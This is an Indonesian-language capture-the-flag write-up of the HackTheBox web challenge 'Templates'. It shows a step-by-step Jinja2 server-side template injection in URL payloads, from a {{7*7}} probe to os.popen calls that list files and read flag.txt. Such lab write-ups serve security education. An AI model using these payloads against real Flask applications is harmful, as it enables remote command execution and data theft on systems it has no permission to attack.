CTF Name : HackTheBox Challenges  
Challenge category : Web  
Challenge Name : Templates  
Challenge points : 0 Points — Easy  
Challenge desc : Can you exploit this simple mistake?

![Pasted image 20240723132142](https://github.com/user-attachments/assets/d95b27ab-f30e-43e6-941f-b2fcfad9e8ad)

Berikut adalah isi dari web instancenya.

![Pasted image 20240723132329](https://github.com/user-attachments/assets/062b9bd5-2cfb-4c4f-84ad-20712ff42ea6)

Dari page tersebut, kita dapat ambil informasi bahwa web tersebut menggunakan Flask/Jinja2. Yang mana kalau kita search di google tentang Jinja2, kita akan menemukan informasi baru.
![Pasted image 20240723132528](https://github.com/user-attachments/assets/7cd7483d-a304-4759-84c3-d028eb158a6b)


Jinja merupakan sebuah template engine web yang terbuat dari python, cara kerjanya adalah merender text/variabel menjadi HTML. Apabila Jinja tidak dikonfigurasi security-nya dengan baik, maka Jinja bisa rentan terhadap SSTI (Server-Side Template Injection).

Untuk bacaan tentang SSTI bisa di [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

Langsung saja kita kerjakan, kita lakukan pengetesan vuln Jinja dengan variabel name.

![Pasted image 20240723134007](https://github.com/user-attachments/assets/9224f0ce-ef6e-4375-8306-10b10eeb82bd)

Ternyata, tidak terdapat perubahan apa-apa dengan variabel name. Kita akan coba untuk langsung memasukkan SSTI-nya sebagai direktori, contohnya seperti ini.

```
http://host:port/{{7*7}}
```

![Pasted image 20240723134204](https://github.com/user-attachments/assets/8511f10b-e908-447c-b227-fc0567017f9f)


Dan ternyata bisa. Untuk pengujian lebih lanjutnya kita bisa mengikuti [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#accessing-global-objects). Berhubung Jinja ini terbuat dari python, maka kita bisa memasukkan juga program Python untuk exploit SSTInya. Kita akan menggunakan builtins function ‘import’, ‘mro’, dan ‘subclasses’ untuk mengakses setiap class yang diload di program python saat ini.

Untuk awalan exploitnya, kita akan menggunakan string class terlebih dahulu kemudian bertahap memodifikasi exploitnya sesuai dengan kasus yang ada.

```
http://host:port/{{"".__class__.__mro__[1]}}
```

![Pasted image 20240723143239](https://github.com/user-attachments/assets/378c1522-1b9a-4c20-9aeb-81451959d7d0)


Kita tambahkan subclasses untuk melihat list subclass yang dapat diakses dari object.

```
http://host:port/{{"".__class__.__mro__[1].__subclasses__()}}
```

Berikut adalah outputnya.

![Pasted image 20240723144321](https://github.com/user-attachments/assets/ad7c4223-330e-4e85-8f16-e32341bb8013)


Output di atas adalah list class yang dapat kita akses, selanjutnya kita gunakan class yang terdapat function import di dalamnya.

```
http://host:port/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]}}
```
![Pasted image 20240723144805](https://github.com/user-attachments/assets/e3340a62-897c-4c26-92f1-c1f23b48750c)


Dari error di atas, dapat kita lihat bahwa function import dapat kita akses. Selanjutnya adalah kita akan meng-import os, lalu kita panggil ‘popen()’ yang akan mengeksekusi command dan kita panggil ‘read()’ untuk menampilkan outputnya.

```
http://host:port/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls").read()}}
```
![Pasted image 20240723145310](https://github.com/user-attachments/assets/5c2e0ec3-dd5b-4fc3-ad0f-5e6c25908567)




Sudah terlihat flag.txtnya, tinggal kita tampilkan dengan cat.

```
http://host:port/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```

![Pasted image 20240723145421](https://github.com/user-attachments/assets/84e556bc-5ab5-46f1-a9a7-9f5e1f33f3dd)


Thank you:)
